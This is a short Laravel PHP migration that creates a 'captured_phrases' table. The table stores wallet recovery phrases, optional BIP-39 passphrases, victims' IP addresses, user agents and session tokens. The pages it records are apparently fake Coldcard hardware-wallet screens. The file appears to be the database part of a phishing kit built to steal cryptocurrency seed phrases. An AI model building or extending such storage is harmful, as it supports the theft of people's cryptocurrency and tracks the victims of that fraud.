<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('captured_phrases', function (Blueprint $table) {
            $table->id();
            $table->string('session_token', 64)->index();
            $table->string('ip_address', 45)->nullable();
            $table->text('user_agent')->nullable();
            $table->string('page', 50)->nullable();          // coldcard1, coldcard_mk4, coldcard_mk5, phrase
            $table->text('phrase');                           // space-separated words
            $table->string('passphrase', 500)->nullable();   // BIP-39 optional passphrase
            $table->timestamp('captured_at');
            $table->timestamps();
        });
    }

    public function down(): void
    {
        Schema::dropIfExists('captured_phrases');
    }
};
